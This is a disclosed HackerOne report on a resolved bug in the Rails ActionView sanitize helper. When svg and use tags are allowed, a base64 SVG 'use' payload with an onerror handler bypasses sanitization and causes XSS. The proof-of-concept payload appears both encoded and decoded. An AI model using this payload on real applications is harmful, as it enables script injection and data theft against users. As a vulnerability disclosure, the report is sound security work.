---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1694173'
original_report_id: '1694173'
title: ActionView sanitize helper bypass leading to XSS using SVG tag.
weakness: Cross-site Scripting (XSS) - Generic
team_handle: rails
created_at: '2022-09-07T21:38:41.383Z'
disclosed_at: '2023-07-10T13:21:43.554Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 20
asset_identifier: https://github.com/rails/rails
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# ActionView sanitize helper bypass leading to XSS using SVG tag.

## Metadata

- HackerOne Report ID: 1694173
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: rails
- Disclosed At: 2023-07-10T13:21:43.554Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

In the specific configuration, it was possible to bypass HTML sanitization by using the `use` tag of the `SVG` element.

In the `index.html.erb`:

```ruby
<%= sanitize "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/></svg>", tags: %w(svg use) %>
```
`use` tag allows to embed another base64 encoded `SVG` containing target XSS payload, base64 after decoding:

```svg
<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='1337' height='1337'>
<image href="1" onerror="alert(window.origin)" />
</svg>
```
`SVG` and `use` tags had to be allowed either in global configuration  `config.action_view.sanitized_allowed_tags = ['svg', 'use']`
or inline with `tags` argument of the helper.

## Impact

XSS could lead to data theft through the attacker’s ability to manipulate data through their access to the application, and their ability to interact with other users, including performing other malicious attacks, which would appear to originate from a legitimate user. These malicious actions could also result in reputational damage for the business through the impact on customers’ trust.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
